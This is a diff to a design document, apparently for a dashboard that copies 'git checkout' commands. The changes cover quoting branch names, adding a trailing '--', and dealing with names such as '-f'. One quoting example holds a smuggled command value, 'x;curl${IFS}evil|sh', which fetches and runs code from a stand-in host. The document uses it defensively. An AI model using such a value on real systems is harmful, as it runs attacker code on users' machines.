@@ -34,8 +34,17 @@ name.
   and `. _ / - + @ = , %` is left bare (`git checkout feature/ABC-1-export`);
   any other is put in single quotes, each `'` in it written `'\''`
   (`git checkout 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
-  characters, `~ ^ : ? * [ \` and a leading `-` in a branch name, so no
-  other case arises.
+  characters and `~ ^ : ? * [ \` in a branch name.
+- **Read by git as a branch only** (after the review of the branch): the
+  command ends with `--` (`git checkout feature/x --`). Without it, a name
+  that is also a path of the repository (`docs`), not fetched yet, makes
+  `git checkout docs` restore that path from the index, losing its
+  changes; with it, git creates the branch from a fetched remote branch as
+  before, and fails ("invalid reference") otherwise. A name starting with
+  `-` follows `--end-of-options` (`git checkout --end-of-options -f --`):
+  `git check-ref-format --branch` refuses a leading `-`, but
+  `refs/heads/-f` can be pushed, and `git checkout -f` would throw the
+  uncommitted changes away. Both checked with git 2.54 and zsh.
 - **A pull request from a fork** (#127): the same command, although the
   branch is not in the destination clone. *Decided*: #127 covers forks
   across the page; a comment there records this case.
@@ -125,6 +134,8 @@ drawer) apply unchanged; neither key is used elsewhere.
   look; muted is enough.
 - **`git fetch && git checkout`**: the user asked for `git checkout`;
   git's DWIM creates the tracking branch from a fetched remote branch.
+- **`git switch <branch>`** (never reads a path): the user asked for
+  `git checkout`; the trailing `--` gives it the same safety.
 - **`document.execCommand('copy')` fallback** over plain http: deprecated;
   the dashboard runs on localhost, and the failure says why.
 - **Buttons on root-branch headers**: a destination branch is checked out
@@ -155,6 +166,7 @@ drawer) apply unchanged; neither key is used elsewhere.
 
 ## 6. Documentation
 
-README.md: a changelog entry for 3.2.0 and the `c` / `b` keys in both
-keyboard paragraphs. PRD.md: a requirement line for the copy buttons and
+README.md: a changelog entry for 3.2.0 and the `c` / `b` keys in the
+keyboard paragraph of the features (the other one is the 3.1.0 changelog
+entry, released). PRD.md: a requirement line for the copy buttons and
 the keys. package.json: 3.2.0 and its release date.
